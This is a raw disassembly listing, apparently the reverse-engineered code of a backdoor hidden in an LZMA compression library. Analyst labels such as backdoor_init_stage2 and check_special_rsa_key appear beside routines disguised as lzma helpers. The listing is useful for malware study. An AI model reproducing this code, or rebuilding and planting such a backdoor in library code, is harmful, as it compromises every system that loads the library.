.text.stream_encoder_mt_iniz:0000000000007EF7                 sub     eax, 3
.text.stream_encoder_mt_iniz:0000000000007EFA                 cmp     eax, 1
.text.stream_encoder_mt_iniz:0000000000007EFD
.text.stream_encoder_mt_iniz:0000000000007EFD loc_7EFD:                               ; CODE XREF: _Lstream_encoder_mt_init_part_0+25↑j
.text.stream_encoder_mt_iniz:0000000000007EFD                 ja      short loc_7F41
.text.stream_encoder_mt_iniz:0000000000007EFF                 mov     eax, 1
.text.stream_encoder_mt_iniz:0000000000007F04                 retn
.text.stream_encoder_mt_iniz:0000000000007F05 ; ---------------------------------------------------------------------------
.text.stream_encoder_mt_iniz:0000000000007F05
.text.stream_encoder_mt_iniz:0000000000007F05 loc_7F05:                               ; CODE XREF: _Lstream_encoder_mt_init_part_0+16↑j
.text.stream_encoder_mt_iniz:0000000000007F05                 mov     rdx, [rdi+0F8h]
.text.stream_encoder_mt_iniz:0000000000007F0C                 test    rdx, rdx
.text.stream_encoder_mt_iniz:0000000000007F0F                 jz      short loc_7F41
.text.stream_encoder_mt_iniz:0000000000007F11                 mov     rax, [rdi+0E8h]
.text.stream_encoder_mt_iniz:0000000000007F18                 cmp     rax, 0ADh
.text.stream_encoder_mt_iniz:0000000000007F1E                 jbe     short loc_7F41
.text.stream_encoder_mt_iniz:0000000000007F20                 movzx   edx, word ptr [rdx]
.text.stream_encoder_mt_iniz:0000000000007F23                 cmp     rdx, rax
.text.stream_encoder_mt_iniz:0000000000007F26                 jb      short loc_7F41
.text.stream_encoder_mt_iniz:0000000000007F28                 lea     rax, [rdx+60h]
.text.stream_encoder_mt_iniz:0000000000007F2C                 cmp     rax, rdx
.text.stream_encoder_mt_iniz:0000000000007F2F                 cmovnb  rdx, rax
.text.stream_encoder_mt_iniz:0000000000007F33                 mov     eax, 1
.text.stream_encoder_mt_iniz:0000000000007F38                 cmp     [rdi+0E0h], rdx
.text.stream_encoder_mt_iniz:0000000000007F3F                 jnb     short locret_7F4D
.text.stream_encoder_mt_iniz:0000000000007F41
.text.stream_encoder_mt_iniz:0000000000007F41 loc_7F41:                               ; CODE XREF: _Lstream_encoder_mt_init_part_0+18↑j
.text.stream_encoder_mt_iniz:0000000000007F41                                         ; _Lstream_encoder_mt_init_part_0:loc_7EFD↑j ...
.text.stream_encoder_mt_iniz:0000000000007F41                 mov     dword ptr [rdi+104h], 0FFFFFFFFh
.text.stream_encoder_mt_iniz:0000000000007F4B
.text.stream_encoder_mt_iniz:0000000000007F4B loc_7F4B:                               ; CODE XREF: _Lstream_encoder_mt_init_part_0+7↑j
.text.stream_encoder_mt_iniz:0000000000007F4B                 xor     eax, eax
.text.stream_encoder_mt_iniz:0000000000007F4D
.text.stream_encoder_mt_iniz:0000000000007F4D locret_7F4D:                            ; CODE XREF: _Lstream_encoder_mt_init_part_0+6F↑j
.text.stream_encoder_mt_iniz:0000000000007F4D                 retn
.text.stream_encoder_mt_iniz:0000000000007F4D _Lstream_encoder_mt_init_part_0 endp
.text.stream_encoder_mt_iniz:0000000000007F4D
.text.stream_encoder_mt_iniz:0000000000007F4D _text_stream_encoder_mt_iniz ends
.text.stream_encoder_mt_iniz:0000000000007F4D
.text.worker_stara:0000000000007F50 ; ===========================================================================
.text.worker_stara:0000000000007F50
.text.worker_stara:0000000000007F50 ; Segment type: Pure code
.text.worker_stara:0000000000007F50 ; Segment permissions: Read/Execute
.text.worker_stara:0000000000007F50 _text_worker_stara segment para public 'CODE' use64
.text.worker_stara:0000000000007F50                 assume cs:_text_worker_stara
.text.worker_stara:0000000000007F50                 ;org 7F50h
.text.worker_stara:0000000000007F50                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.worker_stara:0000000000007F50
.text.worker_stara:0000000000007F50 ; =============== S U B R O U T I N E =======================================
.text.worker_stara:0000000000007F50
.text.worker_stara:0000000000007F50
.text.worker_stara:0000000000007F50 ; __int64 __fastcall Lworker_start_0(char **, unsigned __int64, _QWORD *, __int64)
.text.worker_stara:0000000000007F50 _Lworker_start_0 proc near              ; CODE XREF: _Lfile_info_decode_0+E2↓p
.text.worker_stara:0000000000007F50                 endbr64
.text.worker_stara:0000000000007F54                 test    rdi, rdi
.text.worker_stara:0000000000007F57                 jz      loc_809C
.text.worker_stara:0000000000007F5D                 cmp     rsi, 6
.text.worker_stara:0000000000007F61                 jbe     loc_809C
.text.worker_stara:0000000000007F67                 push    r14
.text.worker_stara:0000000000007F69                 push    r13
.text.worker_stara:0000000000007F6B                 push    r12
.text.worker_stara:0000000000007F6D                 mov     r12, rdx
.text.worker_stara:0000000000007F70                 push    rbp
.text.worker_stara:0000000000007F71                 push    rbx
.text.worker_stara:0000000000007F72                 test    rdx, rdx
.text.worker_stara:0000000000007F75                 jz      loc_809F
.text.worker_stara:0000000000007F7B                 test    rcx, rcx
.text.worker_stara:0000000000007F7E                 jz      loc_809F
.text.worker_stara:0000000000007F84                 mov     r8, [rcx+38h]
.text.worker_stara:0000000000007F88                 xor     eax, eax
.text.worker_stara:0000000000007F8A                 test    r8, r8
.text.worker_stara:0000000000007F8D                 jz      loc_80A1
.text.worker_stara:0000000000007F93                 mov     r9, [rcx+40h]
.text.worker_stara:0000000000007F97                 test    r9, r9
.text.worker_stara:0000000000007F9A                 jz      loc_80A1
.text.worker_stara:0000000000007FA0                 mov     rcx, [rdi]
.text.worker_stara:0000000000007FA3                 mov     rbp, rdi
.text.worker_stara:0000000000007FA6                 mov     rdi, rcx
.text.worker_stara:0000000000007FA9                 add     rdi, rsi
.text.worker_stara:0000000000007FAC                 jb      loc_80A1
.text.worker_stara:0000000000007FB2                 xor     eax, eax
.text.worker_stara:0000000000007FB4
.text.worker_stara:0000000000007FB4 loc_7FB4:                               ; CODE XREF: _Lworker_start_0+AD↓j
.text.worker_stara:0000000000007FB4                 mov     r14, rsi
.text.worker_stara:0000000000007FB7                 lea     rbx, [rcx+rax]
.text.worker_stara:0000000000007FBB                 xor     edx, edx
.text.worker_stara:0000000000007FBD                 sub     r14, rax
.text.worker_stara:0000000000007FC0
.text.worker_stara:0000000000007FC0 loc_7FC0:                               ; CODE XREF: _Lworker_start_0+83↓j
.text.worker_stara:0000000000007FC0                 mov     r10b, [rbx+rdx]
.text.worker_stara:0000000000007FC4                 cmp     [r8+rdx], r10b
.text.worker_stara:0000000000007FC8                 jg      short loc_7FD7
.text.worker_stara:0000000000007FCA                 jl      short loc_7FD7
.text.worker_stara:0000000000007FCC                 inc     rdx
.text.worker_stara:0000000000007FCF                 cmp     rdx, 7
.text.worker_stara:0000000000007FD3                 jnz     short loc_7FC0
.text.worker_stara:0000000000007FD5                 jmp     short loc_8001
.text.worker_stara:0000000000007FD7 ; ---------------------------------------------------------------------------
.text.worker_stara:0000000000007FD7
.text.worker_stara:0000000000007FD7 loc_7FD7:                               ; CODE XREF: _Lworker_start_0+78↑j
.text.worker_stara:0000000000007FD7                                         ; _Lworker_start_0+7A↑j
.text.worker_stara:0000000000007FD7                 xor     edx, edx
.text.worker_stara:0000000000007FD9
.text.worker_stara:0000000000007FD9 loc_7FD9:                               ; CODE XREF: _Lworker_start_0+9C↓j
.text.worker_stara:0000000000007FD9                 mov     r11b, [rbx+rdx]
.text.worker_stara:0000000000007FDD                 cmp     [r9+rdx], r11b
.text.worker_stara:0000000000007FE1                 jg      short loc_7FF0
.text.worker_stara:0000000000007FE3                 jl      short loc_7FF0
.text.worker_stara:0000000000007FE5                 inc     rdx
.text.worker_stara:0000000000007FE8                 cmp     rdx, 7
.text.worker_stara:0000000000007FEC                 jnz     short loc_7FD9
.text.worker_stara:0000000000007FEE                 jmp     short loc_8001
.text.worker_stara:0000000000007FF0 ; ---------------------------------------------------------------------------
.text.worker_stara:0000000000007FF0
.text.worker_stara:0000000000007FF0 loc_7FF0:                               ; CODE XREF: _Lworker_start_0+91↑j
.text.worker_stara:0000000000007FF0                                         ; _Lworker_start_0+93↑j
.text.worker_stara:0000000000007FF0                 inc     rax
.text.worker_stara:0000000000007FF3                 mov     r14, rsi
.text.worker_stara:0000000000007FF6                 sub     r14, rax
.text.worker_stara:0000000000007FF9                 cmp     r14, 6
.text.worker_stara:0000000000007FFD                 jnz     short loc_7FB4
.text.worker_stara:0000000000007FFF                 xor     ebx, ebx
.text.worker_stara:0000000000008001
.text.worker_stara:0000000000008001 loc_8001:                               ; CODE XREF: _Lworker_start_0+85↑j
.text.worker_stara:0000000000008001                                         ; _Lworker_start_0+9E↑j
.text.worker_stara:0000000000008001                 cmp     rax, 7
.text.worker_stara:0000000000008005                 jbe     loc_809F
.text.worker_stara:000000000000800B                 test    rbx, rbx
.text.worker_stara:000000000000800E                 jz      loc_809F
.text.worker_stara:0000000000008014                 mov     edx, [rbx-8]
.text.worker_stara:0000000000008017                 xor     eax, eax
.text.worker_stara:0000000000008019                 bswap   edx
.text.worker_stara:000000000000801B                 cmp     edx, 10000h
.text.worker_stara:0000000000008021                 ja      short loc_80A1
.text.worker_stara:0000000000008023                 mov     edx, edx
.text.worker_stara:0000000000008025                 lea     r13, [rbx+rdx-8]
.text.worker_stara:000000000000802A                 cmp     rdi, r13
.text.worker_stara:000000000000802D                 jb      short loc_80A1
.text.worker_stara:000000000000802F                 mov     rsi, r14
.text.worker_stara:0000000000008032                 mov     rdi, rbx
.text.worker_stara:0000000000008035                 call    sub_7080
.text.worker_stara:000000000000803A                 mov     rdx, rax
.text.worker_stara:000000000000803D                 xor     eax, eax
.text.worker_stara:000000000000803F                 cmp     rdx, r14
.text.worker_stara:0000000000008042                 jnb     short loc_80A1
.text.worker_stara:0000000000008044                 add     rbx, rdx
.text.worker_stara:0000000000008047                 cmp     rbx, r13
.text.worker_stara:000000000000804A                 jnb     short loc_80A1
.text.worker_stara:000000000000804C                 mov     edx, [rbx]
.text.worker_stara:000000000000804E                 bswap   edx
.text.worker_stara:0000000000008050                 cmp     edx, 10000h
.text.worker_stara:0000000000008056                 ja      short loc_80A1
.text.worker_stara:0000000000008058                 lea     eax, [rdx+4]
.text.worker_stara:000000000000805B                 add     rbx, rax
.text.worker_stara:000000000000805E                 xor     eax, eax
.text.worker_stara:0000000000008060                 cmp     rbx, r13
.text.worker_stara:0000000000008063                 jnb     short loc_80A1
.text.worker_stara:0000000000008065                 mov     edx, [rbx]
.text.worker_stara:0000000000008067                 bswap   edx
.text.worker_stara:0000000000008069                 cmp     edx, 10000h
.text.worker_stara:000000000000806F                 ja      short loc_80A1
.text.worker_stara:0000000000008071                 lea     rcx, [rbx+4]
.text.worker_stara:0000000000008075                 mov     esi, edx
.text.worker_stara:0000000000008077                 add     rsi, rcx
.text.worker_stara:000000000000807A                 cmp     r13, rsi
.text.worker_stara:000000000000807D                 jnb     short loc_80A1
.text.worker_stara:000000000000807F                 cmp     byte ptr [rbx+4], 0
.text.worker_stara:0000000000008083                 jnz     short loc_808B
.text.worker_stara:0000000000008085                 lea     rcx, [rbx+5]
.text.worker_stara:0000000000008089                 dec     edx
.text.worker_stara:000000000000808B
.text.worker_stara:000000000000808B loc_808B:                               ; CODE XREF: _Lworker_start_0+133↑j
.text.worker_stara:000000000000808B                 mov     eax, edx
.text.worker_stara:000000000000808D                 mov     [rbp+0], rcx
.text.worker_stara:0000000000008091                 mov     [r12], rax
.text.worker_stara:0000000000008095                 mov     eax, 1
.text.worker_stara:000000000000809A                 jmp     short loc_80A1
.text.worker_stara:000000000000809C ; ---------------------------------------------------------------------------
.text.worker_stara:000000000000809C
.text.worker_stara:000000000000809C loc_809C:                               ; CODE XREF: _Lworker_start_0+7↑j
.text.worker_stara:000000000000809C                                         ; _Lworker_start_0+11↑j
.text.worker_stara:000000000000809C                 xor     eax, eax
.text.worker_stara:000000000000809E                 retn
.text.worker_stara:000000000000809F ; ---------------------------------------------------------------------------
.text.worker_stara:000000000000809F
.text.worker_stara:000000000000809F loc_809F:                               ; CODE XREF: _Lworker_start_0+25↑j
.text.worker_stara:000000000000809F                                         ; _Lworker_start_0+2E↑j ...
.text.worker_stara:000000000000809F                 xor     eax, eax
.text.worker_stara:00000000000080A1
.text.worker_stara:00000000000080A1 loc_80A1:                               ; CODE XREF: _Lworker_start_0+3D↑j
.text.worker_stara:00000000000080A1                                         ; _Lworker_start_0+4A↑j ...
.text.worker_stara:00000000000080A1                 pop     rbx
.text.worker_stara:00000000000080A2                 pop     rbp
.text.worker_stara:00000000000080A3                 pop     r12
.text.worker_stara:00000000000080A5                 pop     r13
.text.worker_stara:00000000000080A7                 pop     r14
.text.worker_stara:00000000000080A9                 retn
.text.worker_stara:00000000000080A9 _Lworker_start_0 endp
.text.worker_stara:00000000000080A9
.text.worker_stara:00000000000080A9 _text_worker_stara ends
.text.worker_stara:00000000000080A9
.text.bt_skip_funz:00000000000080B0 ; ===========================================================================
.text.bt_skip_funz:00000000000080B0
.text.bt_skip_funz:00000000000080B0 ; Segment type: Pure code
.text.bt_skip_funz:00000000000080B0 ; Segment permissions: Read/Execute
.text.bt_skip_funz:00000000000080B0 _text_bt_skip_funz segment para public 'CODE' use64
.text.bt_skip_funz:00000000000080B0                 assume cs:_text_bt_skip_funz
.text.bt_skip_funz:00000000000080B0                 ;org 80B0h
.text.bt_skip_funz:00000000000080B0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.bt_skip_funz:00000000000080B0
.text.bt_skip_funz:00000000000080B0 ; =============== S U B R O U T I N E =======================================
.text.bt_skip_funz:00000000000080B0
.text.bt_skip_funz:00000000000080B0
.text.bt_skip_funz:00000000000080B0 ; __int64 __fastcall Lbt_skip_func_part_0(__int64, int)
.text.bt_skip_funz:00000000000080B0 _Lbt_skip_func_part_0 proc near         ; DATA XREF: backdoor_vtbl_init+61↑o
.text.bt_skip_funz:00000000000080B0                 endbr64
.text.bt_skip_funz:00000000000080B4                 mov     rax, cs:global_ctx
.text.bt_skip_funz:00000000000080BB                 test    rax, rax
.text.bt_skip_funz:00000000000080BE                 jz      short loc_8127
.text.bt_skip_funz:00000000000080C0                 push    rbp
.text.bt_skip_funz:00000000000080C1                 push    rbx
.text.bt_skip_funz:00000000000080C2                 push    rcx
.text.bt_skip_funz:00000000000080C3                 mov     rbp, [rax+10h]
.text.bt_skip_funz:00000000000080C7                 test    rbp, rbp
.text.bt_skip_funz:00000000000080CA                 jz      short loc_8121
.text.bt_skip_funz:00000000000080CC                 mov     rbx, [rax+20h]
.text.bt_skip_funz:00000000000080D0                 test    rbx, rbx
.text.bt_skip_funz:00000000000080D3                 jz      short loc_8121
.text.bt_skip_funz:00000000000080D5                 movzx   edx, word ptr [rbx+84h]
.text.bt_skip_funz:00000000000080DC                 test    dx, dx
.text.bt_skip_funz:00000000000080DF                 jz      short loc_8114
.text.bt_skip_funz:00000000000080E1                 mov     edi, esi
.text.bt_skip_funz:00000000000080E3                 mov     rsi, [rbx+88h]
.text.bt_skip_funz:00000000000080EA                 test    rsi, rsi
.text.bt_skip_funz:00000000000080ED                 jz      short loc_8114
.text.bt_skip_funz:00000000000080EF                 mov     rcx, rbp
.text.bt_skip_funz:00000000000080F2                 call    sub_7120
.text.bt_skip_funz:00000000000080F7                 test    rax, rax
.text.bt_skip_funz:00000000000080FA                 js      short loc_8114
.text.bt_skip_funz:00000000000080FC                 mov     rax, [rbx+0A0h]
.text.bt_skip_funz:0000000000008103                 mov     rdx, [rbx+0D8h]
.text.bt_skip_funz:000000000000810A                 mov     [rax], rdx
.text.bt_skip_funz:000000000000810D                 mov     eax, 1
.text.bt_skip_funz:0000000000008112                 jmp     short loc_8123
.text.bt_skip_funz:0000000000008114 ; ---------------------------------------------------------------------------
.text.bt_skip_funz:0000000000008114
.text.bt_skip_funz:0000000000008114 loc_8114:                               ; CODE XREF: _Lbt_skip_func_part_0+2F↑j
.text.bt_skip_funz:0000000000008114                                         ; _Lbt_skip_func_part_0+3D↑j ...
.text.bt_skip_funz:0000000000008114                 mov     rax, [rbp+18h]
.text.bt_skip_funz:0000000000008118                 test    rax, rax
.text.bt_skip_funz:000000000000811B                 jz      short loc_8121
.text.bt_skip_funz:000000000000811D                 xor     edi, edi
.text.bt_skip_funz:000000000000811F                 call    rax
.text.bt_skip_funz:0000000000008121
.text.bt_skip_funz:0000000000008121 loc_8121:                               ; CODE XREF: _Lbt_skip_func_part_0+1A↑j
.text.bt_skip_funz:0000000000008121                                         ; _Lbt_skip_func_part_0+23↑j ...
.text.bt_skip_funz:0000000000008121                 xor     eax, eax
.text.bt_skip_funz:0000000000008123
.text.bt_skip_funz:0000000000008123 loc_8123:                               ; CODE XREF: _Lbt_skip_func_part_0+62↑j
.text.bt_skip_funz:0000000000008123                 pop     rdx
.text.bt_skip_funz:0000000000008124                 pop     rbx
.text.bt_skip_funz:0000000000008125                 pop     rbp
.text.bt_skip_funz:0000000000008126                 retn
.text.bt_skip_funz:0000000000008127 ; ---------------------------------------------------------------------------
.text.bt_skip_funz:0000000000008127
.text.bt_skip_funz:0000000000008127 loc_8127:                               ; CODE XREF: _Lbt_skip_func_part_0+E↑j
.text.bt_skip_funz:0000000000008127                 xor     eax, eax
.text.bt_skip_funz:0000000000008129                 retn
.text.bt_skip_funz:0000000000008129 _Lbt_skip_func_part_0 endp
.text.bt_skip_funz:0000000000008129
.text.bt_skip_funz:0000000000008129 _text_bt_skip_funz ends
.text.bt_skip_funz:0000000000008129
.text.lzma_coda:0000000000008130 ; ===========================================================================
.text.lzma_coda:0000000000008130
.text.lzma_coda:0000000000008130 ; Segment type: Pure code
.text.lzma_coda:0000000000008130 ; Segment permissions: Read/Execute
.text.lzma_coda:0000000000008130 _text_lzma_coda segment para public 'CODE' use64
.text.lzma_coda:0000000000008130                 assume cs:_text_lzma_coda
.text.lzma_coda:0000000000008130                 ;org 8130h
.text.lzma_coda:0000000000008130                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_coda:0000000000008130
.text.lzma_coda:0000000000008130 ; =============== S U B R O U T I N E =======================================
.text.lzma_coda:0000000000008130
.text.lzma_coda:0000000000008130
.text.lzma_coda:0000000000008130 ; __int64 __fastcall Llzma_code_part_1(__int64, int, __int64)
.text.lzma_coda:0000000000008130 _Llzma_code_part_1 proc near            ; DATA XREF: _Llzma_delta_props_decode_part_0+E↑o
.text.lzma_coda:0000000000008130                                         ; backdoor_init_stage2+30↑o
.text.lzma_coda:0000000000008130
.text.lzma_coda:0000000000008130 var_15          = byte ptr -15h
.text.lzma_coda:0000000000008130
.text.lzma_coda:0000000000008130                 endbr64
.text.lzma_coda:0000000000008134                 push    rbx
.text.lzma_coda:0000000000008135                 mov     rax, rdi
.text.lzma_coda:0000000000008138                 mov     edi, esi
.text.lzma_coda:000000000000813A                 xor     r9d, r9d
.text.lzma_coda:000000000000813D                 sub     rsp, 10h
.text.lzma_coda:0000000000008141                 mov     rsi, cs:global_ctx
.text.lzma_coda:0000000000008148                 mov     qword ptr [rsp+18h+var_15], r9
.text.lzma_coda:000000000000814D                 mov     rcx, [rsi+10h]
.text.lzma_coda:0000000000008151                 mov     rbx, [rsi+20h]
.text.lzma_coda:0000000000008155                 mov     esi, edi
.text.lzma_coda:0000000000008157                 mov     qword ptr [rsp+18h+var_15+5], r9
.text.lzma_coda:000000000000815C                 shr     esi, 1Fh
.text.lzma_coda:000000000000815F                 test    rdx, rdx
.text.lzma_coda:0000000000008162                 setz    dl
.text.lzma_coda:0000000000008165                 or      dl, sil
.text.lzma_coda:0000000000008168                 jnz     short loc_816F
.text.lzma_coda:000000000000816A                 test    rax, rax
.text.lzma_coda:000000000000816D                 jnz     short loc_8185
.text.lzma_coda:000000000000816F
.text.lzma_coda:000000000000816F loc_816F:                               ; CODE XREF: _Llzma_code_part_1+38↑j
.text.lzma_coda:000000000000816F                 test    rcx, rcx
.text.lzma_coda:0000000000008172                 jz      short loc_8181
.text.lzma_coda:0000000000008174                 mov     rax, [rcx+18h]
.text.lzma_coda:0000000000008178                 test    rax, rax
.text.lzma_coda:000000000000817B                 jz      short loc_8181
.text.lzma_coda:000000000000817D                 xor     edi, edi
.text.lzma_coda:000000000000817F                 call    rax
.text.lzma_coda:0000000000008181
.text.lzma_coda:0000000000008181 loc_8181:                               ; CODE XREF: _Llzma_code_part_1+42↑j
.text.lzma_coda:0000000000008181                                         ; _Llzma_code_part_1+4B↑j
.text.lzma_coda:0000000000008181                 xor     eax, eax
.text.lzma_coda:0000000000008183                 jmp     short loc_81ED
.text.lzma_coda:0000000000008185 ; ---------------------------------------------------------------------------
.text.lzma_coda:0000000000008185
.text.lzma_coda:0000000000008185 loc_8185:                               ; CODE XREF: _Llzma_code_part_1+3D↑j
.text.lzma_coda:0000000000008185                 movzx   edx, word ptr [rbx+90h]
.text.lzma_coda:000000000000818C                 test    dx, dx
.text.lzma_coda:000000000000818F                 jz      short loc_819D
.text.lzma_coda:0000000000008191                 mov     rsi, [rbx+98h]
.text.lzma_coda:0000000000008198                 test    rsi, rsi
.text.lzma_coda:000000000000819B                 jnz     short loc_81D2
.text.lzma_coda:000000000000819D
.text.lzma_coda:000000000000819D loc_819D:                               ; CODE XREF: _Llzma_code_part_1+5F↑j
.text.lzma_coda:000000000000819D                 cmp     dword ptr [rbx+0B8h], 1
.text.lzma_coda:00000000000081A4                 mov     eax, [rbx+40h]
.text.lzma_coda:00000000000081A7                 lea     rsi, [rsp+18h+var_15]
.text.lzma_coda:00000000000081AC                 mov     dword ptr [rsp+18h+var_15+5], 1000000h
.text.lzma_coda:00000000000081B4                 sbb     edx, edx
.text.lzma_coda:00000000000081B6                 and     edx, 0FC000000h
.text.lzma_coda:00000000000081BC                 mov     [rsp+18h+var_15+4], al
.text.lzma_coda:00000000000081C0                 add     edx, 9000000h
.text.lzma_coda:00000000000081C6                 mov     dword ptr [rsp+18h+var_15], edx
.text.lzma_coda:00000000000081CA                 bswap   edx
.text.lzma_coda:00000000000081CC                 mov     edx, edx
.text.lzma_coda:00000000000081CE                 add     rdx, 4
.text.lzma_coda:00000000000081D2
.text.lzma_coda:00000000000081D2 loc_81D2:                               ; CODE XREF: _Llzma_code_part_1+6B↑j
.text.lzma_coda:00000000000081D2                 call    sub_7120
.text.lzma_coda:00000000000081D7                 mov     rax, [rbx+0A0h]
.text.lzma_coda:00000000000081DE                 mov     rdx, [rbx+0D0h]
.text.lzma_coda:00000000000081E5                 mov     [rax], rdx
.text.lzma_coda:00000000000081E8                 mov     eax, 1
.text.lzma_coda:00000000000081ED
.text.lzma_coda:00000000000081ED loc_81ED:                               ; CODE XREF: _Llzma_code_part_1+53↑j
.text.lzma_coda:00000000000081ED                 add     rsp, 10h
.text.lzma_coda:00000000000081F1                 pop     rbx
.text.lzma_coda:00000000000081F2                 retn
.text.lzma_coda:00000000000081F2 _Llzma_code_part_1 endp
.text.lzma_coda:00000000000081F2
.text.lzma_coda:00000000000081F2 _text_lzma_coda ends
.text.lzma_coda:00000000000081F2
.text.parse_lzma10:0000000000008200 ; ===========================================================================
.text.parse_lzma10:0000000000008200
.text.parse_lzma10:0000000000008200 ; Segment type: Pure code
.text.parse_lzma10:0000000000008200 ; Segment permissions: Read/Execute
.text.parse_lzma10:0000000000008200 _text_parse_lzma10 segment para public 'CODE' use64
.text.parse_lzma10:0000000000008200                 assume cs:_text_parse_lzma10
.text.parse_lzma10:0000000000008200                 ;org 8200h
.text.parse_lzma10:0000000000008200                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.parse_lzma10:0000000000008200
.text.parse_lzma10:0000000000008200 ; =============== S U B R O U T I N E =======================================
.text.parse_lzma10:0000000000008200
.text.parse_lzma10:0000000000008200
.text.parse_lzma10:0000000000008200 ; _BOOL8 __fastcall Lparse_lzma12_0(__int64, __int64)
.text.parse_lzma10:0000000000008200 _Lparse_lzma12_0 proc near              ; CODE XREF: installed_func_0+5A4↓p
.text.parse_lzma10:0000000000008200                                         ; _Ldecode_buffer_part_0+8D↓p ...
.text.parse_lzma10:0000000000008200
.text.parse_lzma10:0000000000008200 var_98          = byte ptr -98h
.text.parse_lzma10:0000000000008200 var_88          = byte ptr -88h
.text.parse_lzma10:0000000000008200 var_68          = byte ptr -68h
.text.parse_lzma10:0000000000008200
.text.parse_lzma10:0000000000008200                 endbr64
.text.parse_lzma10:0000000000008204                 test    rdi, rdi
.text.parse_lzma10:0000000000008207                 jz      loc_829B
.text.parse_lzma10:000000000000820D                 push    r12
.text.parse_lzma10:000000000000820F                 push    rbp
.text.parse_lzma10:0000000000008210                 push    rbx
.text.parse_lzma10:0000000000008211                 mov     rbx, rsi
.text.parse_lzma10:0000000000008214                 sub     rsp, 0A0h
.text.parse_lzma10:000000000000821B                 test    rsi, rsi
.text.parse_lzma10:000000000000821E                 jnz     short loc_8224
.text.parse_lzma10:0000000000008220
.text.parse_lzma10:0000000000008220 loc_8220:                               ; CODE XREF: _Lparse_lzma12_0+2B↓j
.text.parse_lzma10:0000000000008220                                         ; _Lparse_lzma12_0+65↓j
.text.parse_lzma10:0000000000008220                 xor     eax, eax
.text.parse_lzma10:0000000000008222                 jmp     short loc_828F
.text.parse_lzma10:0000000000008224 ; ---------------------------------------------------------------------------
.text.parse_lzma10:0000000000008224
.text.parse_lzma10:0000000000008224 loc_8224:                               ; CODE XREF: _Lparse_lzma12_0+1E↑j
.text.parse_lzma10:0000000000008224                 mov     r9, [rsi+8]
.text.parse_lzma10:0000000000008228                 test    r9, r9
.text.parse_lzma10:000000000000822B                 jz      short loc_8220
.text.parse_lzma10:000000000000822D                 mov     rdx, rsp
.text.parse_lzma10:0000000000008230                 xor     eax, eax
.text.parse_lzma10:0000000000008232                 lea     rbp, [rsp+0B8h+var_88]
.text.parse_lzma10:0000000000008237                 mov     r12, rdi
.text.parse_lzma10:000000000000823A                 mov     ecx, 0Ch
.text.parse_lzma10:000000000000823F                 mov     rdi, rdx
.text.parse_lzma10:0000000000008242                 mov     r8, rbp
.text.parse_lzma10:0000000000008245                 mov     esi, 30h ; '0'
.text.parse_lzma10:000000000000824A                 rep stosd
.text.parse_lzma10:000000000000824C                 mov     ecx, 1Ch
.text.parse_lzma10:0000000000008251                 mov     rdi, rbp
.text.parse_lzma10:0000000000008254                 rep stosd
.text.parse_lzma10:0000000000008256                 lea     rcx, [rsp+0B8h+var_98]
.text.parse_lzma10:000000000000825B                 mov     rdi, rdx
.text.parse_lzma10:000000000000825E                 call    sub_71C0
.text.parse_lzma10:0000000000008263                 test    eax, eax
.text.parse_lzma10:0000000000008265                 jz      short loc_8220
.text.parse_lzma10:0000000000008267                 mov     r9, [rbx+8]
.text.parse_lzma10:000000000000826B                 lea     rcx, [rsp+0B8h+var_68]
.text.parse_lzma10:0000000000008270                 mov     r8, r12
.text.parse_lzma10:0000000000008273                 mov     rdx, rbp
.text.parse_lzma10:0000000000008276                 lea     rdi, [rbx+108h]
.text.parse_lzma10:000000000000827D                 mov     esi, 39h ; '9'
.text.parse_lzma10:0000000000008282                 call    sub_71C0
.text.parse_lzma10:0000000000008287                 test    eax, eax
.text.parse_lzma10:0000000000008289                 setnz   al
.text.parse_lzma10:000000000000828C                 movzx   eax, al
.text.parse_lzma10:000000000000828F
.text.parse_lzma10:000000000000828F loc_828F:                               ; CODE XREF: _Lparse_lzma12_0+22↑j
.text.parse_lzma10:000000000000828F                 add     rsp, 0A0h
.text.parse_lzma10:0000000000008296                 pop     rbx
.text.parse_lzma10:0000000000008297                 pop     rbp
.text.parse_lzma10:0000000000008298                 pop     r12
.text.parse_lzma10:000000000000829A                 retn
.text.parse_lzma10:000000000000829B ; ---------------------------------------------------------------------------
.text.parse_lzma10:000000000000829B
.text.parse_lzma10:000000000000829B loc_829B:                               ; CODE XREF: _Lparse_lzma12_0+7↑j
.text.parse_lzma10:000000000000829B                 xor     eax, eax
.text.parse_lzma10:000000000000829D                 retn
.text.parse_lzma10:000000000000829D _Lparse_lzma12_0 endp
.text.parse_lzma10:000000000000829D
.text.parse_lzma10:000000000000829D _text_parse_lzma10 ends
.text.parse_lzma10:000000000000829D
.text.lzip_decoder_memconfia:00000000000082A0 ; ===========================================================================
.text.lzip_decoder_memconfia:00000000000082A0
.text.lzip_decoder_memconfia:00000000000082A0 ; Segment type: Pure code
.text.lzip_decoder_memconfia:00000000000082A0 ; Segment permissions: Read/Execute
.text.lzip_decoder_memconfia:00000000000082A0 _text_lzip_decoder_memconfia segment para public 'CODE' use64
.text.lzip_decoder_memconfia:00000000000082A0                 assume cs:_text_lzip_decoder_memconfia
.text.lzip_decoder_memconfia:00000000000082A0                 ;org 82A0h
.text.lzip_decoder_memconfia:00000000000082A0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzip_decoder_memconfia:00000000000082A0
.text.lzip_decoder_memconfia:00000000000082A0 ; =============== S U B R O U T I N E =======================================
.text.lzip_decoder_memconfia:00000000000082A0
.text.lzip_decoder_memconfia:00000000000082A0
.text.lzip_decoder_memconfia:00000000000082A0 ; __int64 __fastcall installed_func_0(__int64, __int64)
.text.lzip_decoder_memconfia:00000000000082A0 installed_func_0 proc near              ; CODE XREF: check_special_rsa_key+CF9↓p
.text.lzip_decoder_memconfia:00000000000082A0                                         ; DATA XREF: install_entries+41↑o
.text.lzip_decoder_memconfia:00000000000082A0                 endbr64
.text.lzip_decoder_memconfia:00000000000082A4                 push    rbp
.text.lzip_decoder_memconfia:00000000000082A5                 xorps   xmm0, xmm0
.text.lzip_decoder_memconfia:00000000000082A8                 mov     ecx, 236h
.text.lzip_decoder_memconfia:00000000000082AD                 xor     eax, eax
.text.lzip_decoder_memconfia:00000000000082AF                 mov     rbp, rsp
.text.lzip_decoder_memconfia:00000000000082B2                 push    r15
.text.lzip_decoder_memconfia:00000000000082B4                 push    r14
.text.lzip_decoder_memconfia:00000000000082B6                 push    r13
